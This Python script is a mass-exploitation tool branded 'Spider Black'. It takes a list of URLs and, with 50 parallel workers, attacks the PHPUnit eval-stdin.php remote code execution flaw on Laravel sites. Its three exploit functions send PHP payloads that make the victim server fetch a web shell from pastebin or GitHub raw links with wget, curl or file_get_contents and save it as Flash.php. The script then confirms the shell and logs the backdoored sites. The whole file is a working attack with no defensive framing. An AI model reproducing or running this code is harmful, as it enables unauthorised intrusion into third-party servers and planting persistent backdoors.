import os
from multiprocessing import Pool
import requests as r
rd, gn, lgn, yw, lrd, be, pe = '\033[00;31m', '\033[00;32m', '\033[01;32m', '\033[01;33m', '\033[01;31m', '\033[00;34m', '\033[01;35m'
cn = '\033[00;36m'
white = "\033[97m"
def screen_clear():
    try:_ = os.system('cls')
    except:_ = os.system('clear')
headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0'}
def laravelrce1(url):
    try:
        checkvuln = '<?php echo php_uname("a"); ?>'
        shelluploader = '<?php system("wget https://pastebin.com/raw/nu5DZpA9 -O Flash.php"); ?>'
        Exploit = r.get(url+'/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', data=checkvuln, timeout=5)
        if 'Linux' in Exploit.text:
            print(f"[====> {yw} Alert Vulnerability {cn}] {Exploit.text}")
            open('Result/VuLaravelPatch.txt', 'a').write(f"{Exploit.text}\n{url}/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php\n")
            r.get(url+'/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', data=shelluploader, timeout=5)
            CheckShell = r.get(url+'/vendor/phpunit/phpunit/src/Util/PHP/Flash.php', timeout=5)
            if 'Flash-XUP' in CheckShell.text:
                print(f"{lgn}#=======>>> Shell Uploaded Successfully : {cn} {url}/vendor/phpunit/phpunit/src/Util/PHP/Flash.php")
                open('Result/Laravel.txt', 'a').write(f"{Exploit.text}\n{url}/vendor/phpunit/phpunit/src/Util/PHP/Flash.php\n")
                open('Result/Shell.txt', 'a').write(f"{url}/vendor/phpunit/phpunit/src/Util/PHP/Flash.php\n")
            else:print(f"{lrd}$-------> Shell Uploading Failed : {url}")
        else:print(f"{lrd}$-------> Site is not Vuln :  {url}")
    except:pass
def laravelrce2(url):
    try:
        checkvuln = '<?php echo php_uname("a"); ?>'
        shelluploader = '<?php fwrite(fopen("Flash.php","w+"),file_get_contents("https://raw.githubusercontent.com/rintod/toolol/master/paywoad.php")); ?>'
        Exploit = r.get(url+'/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', data=checkvuln, timeout=5)
        if 'linux' in Exploit.text:
            print(f"[====> {yw} Alert Vulnerability {cn}] {Exploit.text}")
            open('Result/VuLaravelPatch.txt', 'a').write(f"{Exploit.text}\n{url}/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php\n")
            r.get(url+'/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', data=shelluploader, timeout=5)
            CheckShell = r.get(url+'/vendor/phpunit/phpunit/src/Util/PHP/Flash.php', timeout=5)
            if 'Flash-XUP' in CheckShell.text:
                print(f"{lgn}#=======>>> [{lgn}Shell Uploaded Successfully : {cn} {url}/vendor/phpunit/phpunit/src/Util/PHP/Flash.php")
                open('Result/Shelled_Laravel.txt', 'a').write(f"{Exploit.text}\n{url}/vendor/phpunit/phpunit/src/Util/PHP/Flash.php\n")
                open('Result/Shell.txt', 'a').write(f"{url}/vendor/phpunit/phpunit/src/Util/PHP/Flash.php\n")
            else:print(f"{lrd}$-------> {lgn}Shell Uploading Failed : {gn}{url}")
        else:print(f"{lrd}$-------> {lgn}Site is not Vuln : {gn}{url}")
    except:pass
def laravelrce3(url):
    try:
        checkvuln = '<?php echo php_uname("a"); ?>'
        upshell = '<?php system("curl -O https://pastebin.com/raw/3Qd5Cr2D); system("mv cezpVkxE Flash.php"); ?>'
        Exploit = r.get(url+'/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', data=checkvuln, timeout=5)
        if 'linux' in Exploit.text:
            print(f"[====> {yw} Alert Vulnerability {cn}] {Exploit.text}")
            open('Result/VuLaravelPatch.txt', 'a').write(f"{Exploit.text}\n{url}/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php\n")
            r.get(url+'/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', data=upshell, timeout=5)
            CheckShell = r.get(url+'/vendor/phpunit/phpunit/src/Util/PHP/Flash.php', timeout=5)
            if 'Flash-XUP' in CheckShell.text:
                print(f"{lrd}#=======>>> {lgn}Shell Uploaded Successfully : {cn} {url}/vendor/phpunit/phpunit/src/Util/PHP/Flash.php")
                open('Result/Laravel.txt', 'a').write(f"{Exploit.text}\n{url}/vendor/phpunit/phpunit/src/Util/PHP/Flash.php\n")
                open('Result/Shell.txt', 'a').write(f"{url}/vendor/phpunit/phpunit/src/Util/PHP/Flash.php\n")
            else:print(f"{lrd}$-------> {lgn}Shell Uploading Failed : {gn}{url}")
        else:print(f"{lrd}$-------> {lgn}Site is not Vuln :{gn} {url}")
    except:pass
def up(url):
    url = url.strip()
    try:
       laravelrce1(url)
       laravelrce2(url)
       laravelrce3(url)
    except:pass
def main():
    print(f"""
 {lgn}                                                                                                                            
                          .:==+***++=-.                        
                :#@@@+.  -%@@@@@@@@@@@@@%*=:                   
               *@@*#@=    =@@.   ..::-=*#%@@@*-                
             .#@+::.@%    +@#  .=====--:.  .:=*#+:             
           .=*=:*@* #@-   %@-   *@@@@@@@@@@%#*=-...            
              +@#*@#-@%  =@%   =@@+:...::-=+*#@@@@*=.          
           .=%*.  .@*@@:.@@- -%@#.              .-=+##+:       
         :=+-      =@%@+#@*+@@*+#%#+-                  ::      
{white}               -**+-@@@@@@@@%#@@@@@@@@#:                       
              ::+@@@@@@@@@@@@@@@@@@@@@@@%-                     
                +@@@{lrd}[{lgn}Spider Black{lrd}]{white}@@@@@@@%           
              -*#@@@@@@@@@@@@@@@@@@@@@@%=                      
          .     ::.:@@@%@@#@%#*%@@@@%*-                        
{lrd}         .-*#=     *%%@=+@%.+@@*=-:                 .-==:      
            .+@+. =@=@@. %@+  +@@+           .:-+*%@%+:        
           .-.:#@@@==@*  :@@.  .%@%*+++**#%@@@@%#+-.           
            .*#--%= %@.   #@+   #@@@@@@%%#*=-: .--.            
              =@%=.-@#    =@%   ...     .:=+*%%+:              
               .%@@@@-    +@@*++++**#%@@@@@#+:                 
                 -***=.  =#@@@@@@@@@@@%*+-                     
                             .:::::.          
     {lgn}   @_@ {white}Channel Telelgnam : {lrd} @Esfelurm #_#\n{yw}-------------------------------------------------------------------------------------------------
    
   """)
    list = input(f"{lrd}[{lgn}+{lrd}] {lgn}Please Input Your List : {cn}")
    url = open(list, 'r').readlines()
    try:
       ThreadPool = Pool(50)
       ThreadPool.map(up, url)
       ThreadPool.close()
       ThreadPool.join()
    except:pass
screen_clear()
main()